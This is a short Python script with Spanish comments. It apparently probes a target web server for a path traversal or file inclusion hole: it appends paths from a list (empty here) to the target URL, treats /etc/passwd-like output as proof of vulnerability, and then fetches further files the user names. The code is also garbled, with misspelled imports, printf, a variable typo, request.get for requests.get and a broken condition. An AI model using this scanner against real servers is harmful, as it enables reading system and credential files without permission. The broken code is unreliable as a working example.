import request
import argparse
from bs4 import BeatifulSoup

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo")
parser = parser.parse_args()

def main():
    payloads = [] #Direcciones donde se dea acceder dentro del servidor
    if parser.target:
        printf("Obejtivo=>{parser.target}")
        for p in payloads:
            print("Obejtivo => {}".format(parser.target+p))
            query = requests.get(parser.target+p)
            if 'root' and 'bash' and '/bin' in query.text:
                print("Vulnerable => {}".format(pareser.target))
                b = BeautifulSoup(query.text, "html5lib")
                print(b.blockquote.text)
                insert = input("Buscar archivos... s/n")
                if insert.lower() == "s":
                    file = input("Nombre: ")
                    qf = request.get(parser.target+file)
                    if not "Warning" in qf.text:
                        b = BeautifulSoup(qf.text, "html5lib")
                        print(b.blockquote.text)
                    else:
                        print("Error de consulta")

                        
    else:
        print("Especifique el objetivo")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
